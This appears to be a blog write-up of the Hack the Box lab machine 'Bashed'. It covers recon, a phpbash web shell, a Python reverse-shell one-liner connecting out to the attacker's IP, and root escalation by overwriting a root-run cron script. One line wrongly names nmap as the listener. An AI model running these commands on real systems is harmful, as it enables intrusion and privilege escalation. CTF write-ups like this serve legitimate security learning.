---
layout: post
title: Hack the Box - Bashed
subtitle: Writeup for Bashed CTF - Easy
#cover-img: /assets/img/path.jpg
#thumbnail-img: /assets/img/thumb.png
#share-img: /assets/img/path.jpg
tags: [htb, writeup]#
---

Today I'll do a small quick writeup on the [Bashed](https://www.hackthebox.eu/home/machines/profile/118) Hack the Box machine. This was an Easy, but quite interesting box. Let's get on with it!

## Recon

As always, let's start with nmap

```console
nmap -sV -sC -oN bashed.nmap bashed.htb
```

```console
# Nmap 7.80 scan initiated Mon Oct 19 13:27:40 2020 as: nmap -sV -sC -oN bashed.nmap bashed.htb
Nmap scan report for bashed.htb (10.10.10.68)
Host is up (0.045s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct 19 13:27:49 2020 -- 1 IP address (1 host up) scanned in 9.62 seconds
```

Does not seem to be much open, just an Apache on port 80 serving PHP files

## Web port

On the web we can find a post explaining that [phpbash](https://github.com/Arrexel/phpbash) is installed on this machine. This is a direct reverse shell, so the obvious step to get our initial foothold is to find its path.

![Site on 80](/assets/img/2020-10-21-18-47-56.png)

After launching gobuster, we get that the reverse shell is at the following path: `http://bashed.htb/dev/phpbash.php`. (Sorry I forgot to write down the exact command.)

![webshell](/assets/img/2020-10-21-18-52-17.png)

There we can run a basic python reverse shell to our machine. Do not forget to set up nmap on our host!

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.33",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

## Privilege escalation

If we check with sudo we can see that we can run any comand as the user `scriptmanager`

```console
$ sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

```console
$ sudo -u scriptmanager python -c 'import pty; pty.spawn("/bin/sh")'
$ whoami
whoami
scriptmanager
```

or also `sudo -u scriptmanager bash -i`

There is a folder in `/scripts` that has a python script that is being run as sudo every minute (we can see that by looking at the created file timestamp and permissions). We can modify `test.py` since we have write permissions on this folder, wait a minute and our code will be run as root!

```bash
echo "import os; os.system('cp /root/root.txt /scripts && chmod 777 /scripts/root.txt ');" > test.py
```

## Conclusions

This was a quick and easy machine! I am aware that this was not the best writeup, since the notes i took were not with doing this in mind. I hope the next one is way better.
